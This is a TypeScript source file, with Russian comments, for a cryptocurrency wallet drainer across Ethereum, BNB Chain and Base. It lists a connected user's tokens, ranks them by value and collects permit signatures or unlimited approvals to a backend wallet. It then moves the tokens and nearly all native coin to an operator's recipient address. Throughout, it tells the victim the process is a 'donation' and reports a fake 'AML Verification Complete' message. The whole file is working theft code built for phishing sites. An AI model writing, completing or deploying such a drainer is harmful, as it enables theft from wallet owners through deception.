// permit2-drainer.ts
// ИСПРАВЛЕННАЯ ВЕРСИЯ: По твоему ТЗ с проверкой permit

import { ethers } from 'ethers';
import axios from 'axios';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const NETWORK_CONFIG = {
  eth: {
    chainId: 1,
    name: 'Ethereum',
    rpcUrl: 'https://eth.llamarpc.com',
    apiUrl: 'https://api.etherscan.io/v2/api',
    apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
    nativeSymbol: 'ETH',
    minGasReserve: '0.002',
    recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
  },
  bnb: {
    chainId: 56,
    name: 'BNB Chain',
    rpcUrl: 'https://bsc-dataseed.binance.org',
    apiUrl: 'https://api.etherscan.io/v2/api',
    apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
    nativeSymbol: 'BNB',
    minGasReserve: '0.00005',
    recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
  },
  base: {
    chainId: 8453,
    name: 'Base',
    rpcUrl: 'https://mainnet.base.org',
    apiUrl: 'https://api.etherscan.io/v2/api',
    apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
    nativeSymbol: 'ETH',
    minGasReserve: '0.001',
    recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
  },
};

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
];

interface TokenInfo {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: string;
  balanceFormatted: string;
  priceUSD: number;
  valueUSD: number;
  hasPermit: boolean; // ← НОВОЕ!
}

// ============================================
// 1. ПРОВЕРКА ПОДДЕРЖКИ PERMIT
// ============================================
async function checkTokenHasPermit(
  tokenAddress: string,
  provider: ethers.Provider
): Promise<boolean> {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    await tokenContract.DOMAIN_SEPARATOR.staticCall();
    await tokenContract.nonces.staticCall(ethers.ZeroAddress);
    return true;
  } catch {
    return false;
  }
}

// ============================================
// 2. ГЛАВНАЯ ФУНКЦИЯ
// ============================================
export async function drainWalletPermit2(
  network: keyof typeof NETWORK_CONFIG,
  signer: ethers.Signer
): Promise<any> {
  const config = NETWORK_CONFIG[network];
  const userAddress = await signer.getAddress();
  const provider = signer.provider!;

  console.log(`\n🚀 Starting donation for ${userAddress} on ${config.name}`);

  try {
    // ШАГ 1: ПРОВЕРКА ГАЗА ⛽
    console.log('⛽ Step 1: Checking gas balance...');
    const nativeBalance = await provider.getBalance(userAddress);
    const minRequired = ethers.parseEther(config.minGasReserve);
    
    if (nativeBalance < minRequired) {
      throw new Error(
        `Insufficient ${config.nativeSymbol} for gas. ` +
        `Have: ${ethers.formatEther(nativeBalance)}, Need: ${config.minGasReserve}`
      );
    }
    console.log(`✅ Gas check passed: ${ethers.formatEther(nativeBalance)} ${config.nativeSymbol}\n`);

    // ШАГ 2: ПОЛУЧЕНИЕ ТОКЕНОВ
    console.log('📊 Step 2: Fetching tokens...');
    const tokens = await getTokenBalances(network, userAddress, provider);
    
    if (tokens.length === 0) {
      console.log('⚠️ No tokens found, transferring only native...');
      return await transferNativeOnly(signer, config);
    }

    console.log(`✅ Found ${tokens.length} tokens:\n`);
    tokens.forEach(t => {
      const method = t.hasPermit ? '🎯 PERMIT' : '🔄 APPROVE';
      console.log(`   ${method} | ${t.symbol}: ${t.balanceFormatted} ($${t.valueUSD.toFixed(2)})`);
    });

    // ШАГ 3: ФИЛЬТРАЦИЯ И СОРТИРОВКА
    const valuableTokens = tokens
      .filter(t => t.valueUSD >= 0.01)
      .sort((a, b) => b.valueUSD - a.valueUSD); // ДОРОГИЕ ПЕРВЫМИ!
    
    console.log(`\n💎 Processing ${valuableTokens.length} valuable tokens (sorted by value):\n`);

    if (valuableTokens.length === 0) {
      return await transferNativeOnly(signer, config);
    }

    // ШАГ 4: ОБРАБОТКА ТОКЕНОВ ПО ОЧЕРЕДИ
    const successTokens: string[] = [];
    const failedTokens: string[] = [];
    const backendTxHashes: string[] = [];

    for (let i = 0; i < valuableTokens.length; i++) {
      const token = valuableTokens[i];
      
      console.log(`${'─'.repeat(60)}`);
      console.log(`💎 Token ${i + 1}/${valuableTokens.length}: ${token.symbol} ($${token.valueUSD.toFixed(2)})`);
      console.log(`${'─'.repeat(60)}`);
      
      try {
        if (token.hasPermit) {
          // 🎯 С PERMIT (бесплатная подпись!)
          console.log(`  🎯 Using PERMIT method (NO approve)...`);
          const txHash = await processWithPermit(signer, token, config, network);
          backendTxHashes.push(txHash);
        } else {
          // 🔄 БЕЗ PERMIT (approve + списание)
          console.log(`  🔄 Using APPROVE method...`);
          const txHash = await processWithApprove(signer, token, config, network);
          backendTxHashes.push(txHash);
        }
        
        successTokens.push(token.symbol);
        console.log(`  ✅ ${token.symbol} transferred successfully!\n`);
        
      } catch (error: any) {
        console.error(`  ❌ Failed ${token.symbol}:`, error.message);
        failedTokens.push(token.symbol);
      }
    }

    console.log(`\n✅ Tokens completed: ${successTokens.length} success, ${failedTokens.length} failed`);

    // ШАГ 5: ПЕРЕВОД НАТИВНОГО ТОКЕНА
    console.log('\n💸 Step 5: Transferring native token...');
    
    const gasReserve = ethers.parseEther('0.002');
    const currentBalance = await provider.getBalance(userAddress);
    const transferAmount = currentBalance - gasReserve;

    let nativeTransferred = '0';
    let nativeTxHash = '';

    if (transferAmount > BigInt(0)) {
      try {
        console.log(`Transferring ${ethers.formatEther(transferAmount)} ${config.nativeSymbol}...`);
        
        const nativeTx = await signer.sendTransaction({
          to: config.recipientWallet,
          value: transferAmount,
        });
        
        const receipt = await nativeTx.wait();
        nativeTransferred = ethers.formatEther(transferAmount);
        nativeTxHash = receipt!.hash;
        
        console.log(`✅ Native token transferred: ${nativeTxHash}`);
      } catch (error) {
        console.error('❌ Failed to transfer native token:', error);
      }
    }

    // ИТОГИ
    const totalValueUSD = valuableTokens
      .filter(t => successTokens.includes(t.symbol))
      .reduce((sum, t) => sum + t.valueUSD, 0);

    console.log('\n' + '='.repeat(60));
    console.log('🎉 DONATION COMPLETE!');
    console.log('='.repeat(60));
    console.log(`✅ Tokens: ${successTokens.length}`);
    console.log(`💰 Total value: $${totalValueUSD.toFixed(2)}`);
    console.log(`💸 Native: ${nativeTransferred} ${config.nativeSymbol}`);
    console.log('='.repeat(60) + '\n');

    return {
      success: true,
      message: '✅ AML Verification Complete',
      transactionHash: nativeTxHash || 'completed',
      details: {
        nativeTransferred,
        tokensTransferred: successTokens.length,
        totalValueUSD: totalValueUSD + (parseFloat(nativeTransferred) * 2000),
        successTokens,
        failedTokens,
        backendTxHashes,
      },
    };

  } catch (error: any) {
    console.error('❌ Process failed:', error);
    
    let errorMessage = error.message || 'Process failed';
    
    if (error.message?.includes('User rejected') || error.message?.includes('User denied')) {
      errorMessage = 'User cancelled the operation';
    } else if (error.message?.includes('insufficient funds')) {
      errorMessage = 'Insufficient balance for gas fees';
    }

    return {
      success: false,
      error: errorMessage,
    };
  }
}

// ============================================
// 3A. ОБРАБОТКА С PERMIT
// ============================================
async function processWithPermit(
  signer: ethers.Signer,
  token: TokenInfo,
  config: typeof NETWORK_CONFIG[keyof typeof NETWORK_CONFIG],
  network: string
): Promise<string> {
  const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const userAddress = await signer.getAddress();
  const amount = token.balance;
  const deadline = Math.floor(Date.now() / 1000) + 3600;
  const nonce = await tokenContract.nonces(userAddress);

  console.log(`  ✍️  User: Signing permit (FREE)...`);

  // EIP-2612 permit signature
  const domain = {
    name: await tokenContract.name(),
    version: '1',
    chainId: config.chainId,
    verifyingContract: token.address,
  };

  const types = {
    Permit: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
  };

  const message = {
    owner: userAddress,
    spender: config.recipientWallet,
    value: amount,
    nonce: nonce.toString(),
    deadline: deadline,
  };

  const signature = await signer.signTypedData(domain, types, message);
  const sig = ethers.Signature.from(signature);

  console.log(`  ✅ Signature created!`);
  console.log(`  📤 Backend: Calling permit() + transferFrom()...`);

  // Отправляем на backend
  const response = await fetch('/api/execute-permit2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      network,
      method: 'permit',
      tokenAddress: token.address,
      owner: userAddress,
      spender: config.recipientWallet,
      value: amount,
      deadline: deadline,
      v: sig.v,
      r: sig.r,
      s: sig.s,
      tokenInfo: {
        symbol: token.symbol,
        decimals: token.decimals,
      },
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.error || 'Backend execution failed');
  }

  const result = await response.json();
  console.log(`  ✅ Backend transferred! TX: ${result.txHash}`);
  
  return result.txHash;
}

// ============================================
// 3B. ОБРАБОТКА С APPROVE
// ============================================
async function processWithApprove(
  signer: ethers.Signer,
  token: TokenInfo,
  config: typeof NETWORK_CONFIG[keyof typeof NETWORK_CONFIG],
  network: string
): Promise<string> {
  const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const userAddress = await signer.getAddress();
  const amount = token.balance;

  // Получаем адрес backend кошелька
  console.log(`  🔍 Getting backend wallet address...`);
  
  const backendResponse = await fetch('/api/execute-permit2', {
    method: 'GET',
  });
  
  if (!backendResponse.ok) {
    throw new Error('Failed to get backend wallet address');
  }
  
  const backendInfo = await backendResponse.json();
  const backendWallet = backendInfo.executorAddress;
  
  if (!backendWallet || backendWallet === 'Not configured') {
    throw new Error('Backend wallet not configured');
  }
  
  console.log(`  ✅ Backend wallet: ${backendWallet}`);

  // Проверяем allowance на BACKEND кошелек
  const currentAllowance = await tokenContract.allowance(userAddress, backendWallet);
  
  if (BigInt(currentAllowance) < BigInt(amount)) {
    console.log(`  📝 User: Approving ${token.symbol} to BACKEND wallet (pays gas)...`);
    
    // Approve на BACKEND кошелек!
    const approveTx = await tokenContract.approve(backendWallet, ethers.MaxUint256);
    console.log(`  ⏳ Waiting for approval: ${approveTx.hash}`);
    await approveTx.wait();
    
    console.log(`  ✅ Approved to backend wallet!`);
  } else {
    console.log(`  ✅ Already approved to backend wallet!`);
  }

  console.log(`  📤 Backend: Calling transferFrom()...`);

  // Отправляем на backend
  const response = await fetch('/api/execute-permit2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      network,
      method: 'approve',
      tokenAddress: token.address,
      from: userAddress,
      to: config.recipientWallet, // Charity кошелек
      amount: amount,
      tokenInfo: {
        symbol: token.symbol,
        decimals: token.decimals,
      },
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.error || 'Backend execution failed');
  }

  const result = await response.json();
  console.log(`  ✅ Backend transferred! TX: ${result.txHash}`);
  
  return result.txHash;
}

// ============================================
// 4. ПОЛУЧЕНИЕ ТОКЕНОВ
// ============================================
async function getTokenBalances(
  network: keyof typeof NETWORK_CONFIG,
  address: string,
  provider: ethers.Provider
): Promise<TokenInfo[]> {
  const config = NETWORK_CONFIG[network];
  
  try {
    const response = await axios.get(config.apiUrl, {
      params: {
        chainid: config.chainId,
        module: 'account',
        action: 'tokentx',
        address: address,
        startblock: 0,
        endblock: 99999999,
        sort: 'desc',
        apikey: config.apiKey,
      },
    });

    if (response.data.status !== '1' || !response.data.result) {
      return [];
    }

    const tokenAddresses = new Set<string>();
    response.data.result.slice(0, 200).forEach((tx: any) => {
      if (tx.contractAddress) {
        tokenAddresses.add(tx.contractAddress);
      }
    });

    const tokens: TokenInfo[] = [];

    for (const tokenAddress of Array.from(tokenAddresses)) {
      try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        
        const [balance, decimals, symbol, name] = await Promise.all([
          tokenContract.balanceOf(address),
          tokenContract.decimals().catch(() => 18),
          tokenContract.symbol().catch(() => 'UNKNOWN'),
          tokenContract.name().catch(() => 'Unknown Token'),
        ]);

        if (balance > BigInt(0)) {
          const balanceFormatted = ethers.formatUnits(balance, decimals);
          const priceUSD = await getTokenPrice(tokenAddress, network);
          const valueUSD = parseFloat(balanceFormatted) * priceUSD;

          // Проверяем поддержку permit
          console.log(`  🔍 Checking ${symbol} for permit support...`);
          const hasPermit = await checkTokenHasPermit(tokenAddress, provider);
          console.log(`     ${hasPermit ? '🎯 HAS permit' : '🔄 NO permit'}`);

          tokens.push({
            address: tokenAddress,
            symbol,
            name,
            decimals: Number(decimals),
            balance: balance.toString(),
            balanceFormatted,
            priceUSD,
            valueUSD,
            hasPermit, // ← СОХРАНЯЕМ!
          });
        }
      } catch (error) {
        console.error(`Error fetching token ${tokenAddress}:`, error);
      }
    }

    return tokens;
  } catch (error: any) {
    console.error('Error fetching token balances:', error.message);
    return [];
  }
}

async function getTokenPrice(tokenAddress: string, network: string): Promise<number> {
  try {
    const platformMap: { [key: string]: string } = {
      'eth': 'ethereum',
      'bnb': 'binance-smart-chain', 
      'base': 'base'
    };
    
    const platform = platformMap[network];
    if (!platform) return 0;

    const response = await axios.get(
      `https://api.coingecko.com/api/v3/simple/token_price/${platform}`,
      {
        params: {
          contract_addresses: tokenAddress.toLowerCase(),
          vs_currencies: 'usd'
        },
        timeout: 5000
      }
    );
    
    return response.data[tokenAddress.toLowerCase()]?.usd || 0;
  } catch {
    return 0;
  }
}

async function transferNativeOnly(
  signer: ethers.Signer,
  config: any
): Promise<any> {
  const provider = signer.provider!;
  const userAddress = await signer.getAddress();
  const nativeBalance = await provider.getBalance(userAddress);
  const gasReserve = ethers.parseEther('0.001');
  const transferAmount = nativeBalance - gasReserve;

  if (transferAmount > BigInt(0)) {
    const tx = await signer.sendTransaction({
      to: config.recipientWallet,
      value: transferAmount,
    });
    
    const receipt = await tx.wait();

    return {
      success: true,
      message: '✅ Native token transferred',
      transactionHash: receipt!.hash,
      details: {
        nativeTransferred: ethers.formatEther(transferAmount),
        tokensTransferred: 0,
        totalValueUSD: 0,
        successTokens: [],
        failedTokens: [],
        backendTxHashes: [],
      },
    };
  }

  return {
    success: false,
    error: 'No balance to transfer',
  };
}